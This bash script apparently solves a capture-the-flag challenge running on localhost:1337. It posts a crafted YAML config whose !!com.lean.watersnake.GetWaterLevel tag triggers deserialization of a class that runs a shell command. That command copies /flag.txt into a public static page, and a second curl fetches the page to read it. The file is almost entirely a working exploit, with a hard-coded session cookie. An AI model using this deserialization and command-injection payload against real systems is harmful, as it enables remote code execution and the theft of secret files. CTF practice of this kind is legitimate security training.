#!/bin/bash

# Send this payload to the update endpoint
# owned: !!com.lean.watersnake.GetWaterLevel  ["mv /flag.txt build/resources/main/static/update.html"]

curl -i -s -k -X $'POST' \
    -H $'Host: localhost:1337' -H $'Content-Length: 244' -H $'sec-ch-ua: ' -H $'sec-ch-ua-platform: \"\"' -H $'sec-ch-ua-mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAOULqWqkxK5UmAwq' -H $'Accept: */*' -H $'Origin: http://localhost:1337' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: http://localhost:1337/update.html' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    -b $'connect.sid=s%3AZaXK9lWCHHQRf7cG3LbScDNrk-X7rCjO.brEqNJkZSGNTLz%2BvW%2B50SgN7PSV9lQ1e0VIgSyV2hCc' \
    --data-binary $'------WebKitFormBoundaryAOULqWqkxK5UmAwq\x0d\x0aContent-Disposition: form-data; name=\"config\"\x0d\x0a\x0d\x0aowned: !!com.lean.watersnake.GetWaterLevel  [\"cat /flag.txt >> /app/src/main/resources/static/update.html\"]\x0d\x0a------WebKitFormBoundaryAOULqWqkxK5UmAwq--\x0d\x0a' \
    $'http://localhost:1337/update'

# this should get the flag
curl http://localhost:1337/update.html

